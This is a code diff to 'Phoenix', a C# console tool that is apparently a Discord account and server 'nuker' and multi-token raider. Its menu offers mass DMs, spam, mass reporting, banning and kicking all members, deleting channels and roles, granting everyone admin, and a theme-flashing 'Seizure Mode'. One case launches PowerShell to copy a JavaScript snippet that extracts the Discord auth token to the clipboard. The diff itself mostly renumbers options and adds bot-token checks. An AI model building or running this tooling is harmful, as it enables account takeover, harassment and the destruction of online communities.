@@ -72,24 +72,24 @@ namespace Phoenix
             {
                 WriteLogo();
                 string options = @"
-╔════════════════════════╦════════════════════════════════════════════════════════════╦═════════════════════╗
-║ > Account Nuker        ║ > Server Nuker                                             ║ > MultiToken Raider ║
-╠══╦═════════════════════╬══╦══════════════════════╦══╦═══════════════════════════════╬══╦══════════════════╣
-║01║ Edit Profile        ║15║ Delete Roles         ║29║ Delete Stickers               ║43║ Join Group       ║
-║02║ Leave/Delete Guilds ║16║ Remove All Bans      ║30║ Grant Everyone Admin          ║44║ Leave Guild      ║
-║03║ Clear Relationships ║17║ Delete All Channels  ║31║ Delete Auto Moderation Rules  ║45║ Spam             ║
-║04║ Leave HypeSquad     ║18║ Delete All Emojis    ║32║ Mass Create Invites           ║46║ Add Reaction     ║
-║05║ Remove Connections  ║19║ Delete All Invites   ║33║ Delete Guild Scheduled Events ║47║ DM User          ║
-║06║ Deauthorize Apps    ║20║ Mass Create Roles    ║34║ Delete Guild Template         ║48║ Leave Group      ║
-║07║ Mass Create Guilds  ║21║ Mass Create Channels ║35║ Delete Stage Instances        ║49║ Trigger Typing   ║
-║08║ Seizure Mode        ║22║ Prune Members        ║36║ Delete All Webhooks           ║50║ Report Message   ║
-║09║ Confuse Mode        ║23║ Remove Integrations  ║37║ Webhook Spammer               ║51║ Boost Server     ║
-║10║ Mass DM             ║24║ Remove All Reactions ║38║ Mass Report                   ║52║ Check Tokens     ║
-║11║ User Info           ║25║ Guild Info           ║39║ Ban All Members               ║53║ Exit             ║
-║12║ Delete DMs          ║26║ Leave/Delete Guild   ║40║ Kick All Members              ║54║                  ║
-║13║ Copy Login Code     ║27║ Msg In Every Channel ║41║ Rename Everyone               ║55║                  ║
-║14║ Change Token        ║28║ Delete Webhook       ║42║ Change Guild ID               ║56║                  ║
-╚══╩═════════════════════╩══╩══════════════════════╩══╩═══════════════════════════════╩══╩══════════════════╝
+╔════════════════════════╦════════════════════════════════════════════════════════════╦══════════════════════╗
+║ > Account Nuker        ║ > Server Nuker                                             ║ > Multi-token Raider ║
+╠══╦═════════════════════╬══╦══════════════════════╦══╦═══════════════════════════════╬══╦═══════════════════╣
+║01║ Edit Profile        ║15║ Delete All Roles     ║29║ Delete Stickers               ║43║ Join Group        ║
+║02║ Leave/Delete Guilds ║16║ Remove All Bans      ║30║ Grant Everyone Admin          ║44║ Leave Guild       ║
+║03║ Clear Relationships ║17║ Delete All Channels  ║31║ Delete Auto Moderation Rules  ║45║ Spam              ║
+║04║ Leave HypeSquad     ║18║ Delete All Emojis    ║32║ Mass Create Invites           ║46║ Add Reaction      ║
+║05║ Remove Connections  ║19║ Delete All Invites   ║33║ Delete Guild Scheduled Events ║47║ DM User           ║
+║06║ Deauthorize Apps    ║20║ Mass Create Roles    ║34║ Delete Guild Template         ║48║ Leave Group       ║
+║07║ Seizure Mode        ║21║ Mass Create Channels ║35║ Delete Stage Instances        ║49║ Trigger Typing    ║
+║08║ Confuse Mode        ║22║ Prune Members        ║36║ Delete All Webhooks           ║50║ Report Message    ║
+║09║ Mass DM             ║23║ Remove Integrations  ║37║ Webhook Spammer               ║51║ Boost Server      ║
+║10║ User Info           ║24║ Remove All Reactions ║38║ Mass Report                   ║52║ Check Tokens      ║
+║11║ Delete DMs          ║25║ Guild Info           ║39║ Ban All Members               ║53║ Exit              ║
+║12║ Copy Login Code     ║26║ Leave/Delete Guild   ║40║ Kick All Members              ║54║                   ║
+║13║ Change Token        ║27║ Msg In Every Channel ║41║ Rename Everyone               ║55║                   ║
+║14║                     ║28║ Delete Webhook       ║42║ Change Guild ID               ║56║                   ║
+╚══╩═════════════════════╩══╩══════════════════════╩══╩═══════════════════════════════╩══╩═══════════════════╝
 ";
 
                 Console.WriteWithGradient(options, Color.OrangeRed, Color.Yellow, 7);
@@ -102,7 +102,6 @@ namespace Phoenix
                     default:
                         Console.WriteLine("Not a valid option.");
                         Sleep(Wait.Long);
-                        Console.Clear();
                         Options();
                         break;
                     case 1:
@@ -164,36 +163,16 @@ namespace Phoenix
                     case 7:
                         Token();
                         WriteLogo();
-                        Console.Write("Guild name (leave blank for random): ");
-                        string name = Console.ReadLine();
-                        if (string.IsNullOrEmpty(name)) name = "øæåäöüéíóúüñçčćđšžàèąęėįšųūøßłțșîâăơưãѩѭѧѫѱѯюыщчв的我ㄱㄴㄷ";
-                        WriteLogo();
-                        Console.Write("Count (max 100): ");
-                        int count = int.Parse(Console.ReadLine());
-                        WriteLogo();
-                        int numb = 0;
-                        for (int i = 0; i < count; i++)
-                        {
-                            numb++;
-                            User.CreateGuild(token, name);
-                            Console.ReplaceAllColorsWithDefaults();
-                            Console.WriteLine($"Created: {numb}", Color.Lime);
-                        }
+                        Task.Run(() => { for (; ; ) { try { foreach (var token in tokenlist) User.ChangeTheme(token, "light"); User.ChangeTheme(token, "dark"); } catch { } } });
                         Options();
                         break;
                     case 8:
                         Token();
                         WriteLogo();
-                        Task.Run(() => { for (; ; ) { try { foreach (var token in tokenlist) User.ChangeTheme(token, "light"); User.ChangeTheme(token, "dark"); } catch { } } });
-                        Options();
-                        break;
-                    case 9:
-                        Token();
-                        WriteLogo();
                         User.ConfuseMode(token);
                         Options();
                         break;
-                    case 10:
+                    case 9:
                         Token();
                         WriteLogo();
                         Console.Write("Message: ");
@@ -202,28 +181,32 @@ namespace Phoenix
                         User.MassDM(token, message);
                         Options();
                         break;
-                    case 11:
+                    case 10:
                         Token();
                         WriteLogo();
                         User.UserInformation(token);
                         Options();
                         break;
-                    case 12:
+                    case 11:
                         Token();
                         WriteLogo();
                         User.DeleteDMs(token);
                         Options();
                         break;
-                    case 13:
+                    case 12:
                         WriteLogo();
                         new Process { StartInfo = new ProcessStartInfo { FileName = "powershell", Arguments = "-command \"Set-Clipboard -Value \\\"(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()\\\"\"" } }.Start();
                         Options();
                         break;
-                    case 14:
+                    case 13:
                         WriteLogo();
                         Console.Write("Token: ");
                         string? newtoken = Console.ReadLine();
                         token = newtoken;
+                        Options();
+                        break;
+                    case 14:
+                        WriteLogo();
                         Options();
                         break;
                     case 15:
@@ -495,28 +478,48 @@ namespace Phoenix
                     case 39:
                         GuildID();
                         WriteLogo();
-                        Bot.BanAllMembers(token, guildid);
+                        if (IsBot == true) Bot.BanAllMembers(token, guildid);
+                        else
+                        {
+                            Console.WriteLine("To use this feature, you must use a bot token.");
+                            Sleep(Wait.Long);
+                        }
                         Options();
                         break;
                     case 40:
                         GuildID();
                         WriteLogo();
-                        Bot.KickAllMembers(token, guildid);
+                        if (IsBot == true) Bot.KickAllMembers(token, guildid);
+                        else
+                        {
+                            Console.WriteLine("To use this feature, you must use a bot token.");
+                            Sleep(Wait.Long);
+                        }
                         Options();
                         break;
                     case 41:
                         GuildID();
                         WriteLogo();
-                        Console.Write("Nickname (leave blank for random): ");
-                        string nick = Console.ReadLine();
-                        if (string.IsNullOrEmpty(nick)) nick = "øæåäöüéíóúüñçčćđšžàèąęėįšųūøßłțșîâăơưãѩѭѧѫѱѯюыщчв的我ㄱㄴㄷ";
-                        WriteLogo();
-                        Bot.ChangeAllNicknames(token, guildid, nick);
+                        if (IsBot == true)
+                        {
+                            Console.Write("Nickname (leave blank for random): ");
+                            string nick = Console.ReadLine();
+                            if (string.IsNullOrEmpty(nick)) nick = "øæåäöüéíóúüñçčćđšžàèąęėįšųūøßłțșîâăơưãѩѭѧѫѱѯюыщчв的我ㄱㄴㄷ";
+                            WriteLogo();
+                            Bot.ChangeAllNicknames(token, guildid, nick);
+                        }
+                        else
+                        {
+                            Console.WriteLine("To use this feature, you must use a bot token.");
+                            Sleep(Wait.Long);
+                        }
                         Options();
                         break;
                     case 42:
-                        guildid = null;
-                        GuildID();
+                        WriteLogo();
+                        Console.Write("Guild ID: ");
+                        ulong? newguildid = ulong.Parse(Console.ReadLine());
+                        guildid = newguildid;
                         Options();
                         break;
                     case 43:
@@ -633,12 +636,13 @@ namespace Phoenix
                             Console.ForegroundColor = Color.Yellow;
                             string options8 = @"
 To add any other Discord emoji:
-1. In Discord server, enter :thumbsup: (change the thumbsup to any emoji you want), copy the emoji.
-2. Go to urlencoder.org, in the first text box paste the emoji you copied and click the ""ENCODE"" button.
-3. Paste the result below. (It should look like %F0%9F%91%8D - the thumbsup emoji)
+1. In a Discord server, enter the desired emoji such as :thumbsup: (replace ""thumbsup"" with any emoji of your choice) and copy the emoji.
+2. Go to urlencoder.org, paste the copied emoji in the first text box and click the ""ENCODE"" button.
+3. Paste the result below. (It should look like %F0%9F%91%8D, which represents the thumbs up emoji)
+
 To add any custom emoji:
-1. In Discord server, enter \:customimage: (change the customimage to any custom emoji you want), send the message.
-2. The result will look like <:customimage:1071451591124721684>, copy the text without <> (:customimage:1071451591124721684).
+1. In a Discord server, enter the desired custom emoji such as :customimage: (replace ""customimage"" with any custom emoji of your choice) and send the message.
+2. The result will look like <:customimage:1071451591124721684>, copy the text without the angle brackets (i.e. :customimage:1071451591124721684).
 3. Paste the copied text below.
 ";
                             Console.Write(options8);
